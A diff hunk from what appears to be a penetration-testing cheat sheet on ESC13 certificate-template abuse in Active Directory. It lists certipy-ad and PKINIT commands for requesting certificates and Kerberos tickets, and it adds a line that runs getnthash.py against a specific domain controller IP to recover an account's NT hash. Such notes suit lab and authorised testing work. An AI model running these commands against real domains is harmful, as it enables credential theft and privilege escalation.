@@ -31,6 +31,7 @@ certipy-ad find -u 'username@domain.local' -p 'password' -dc-ip <DC_IP> -vulnera
 certipy-ad req -u "user@domain.local" -p "Password123" -ca "CORP-CA" -target "ca.corp.local" -template "ESC13TemplateName" # Request template
 python3 gettgtpkinit.py -cert-pfx ESC13TemplateName.pfx domain.local/user user.ccache
 # set correct time PLEASE before doing this
+python3 getnthash.py -dc-ip 10.1.152.66 -key <aes_key> KITSUNE.local/ranch
 export KRB5CCNAME=user.ccache
 
 certipy-ad req -u user@domain.local -p 'Password' -target <HOSTNAME_OR_IP> -target-ip 192.168.1.50 -dc-ip 192.168.1.10 -template User -key-size 4096
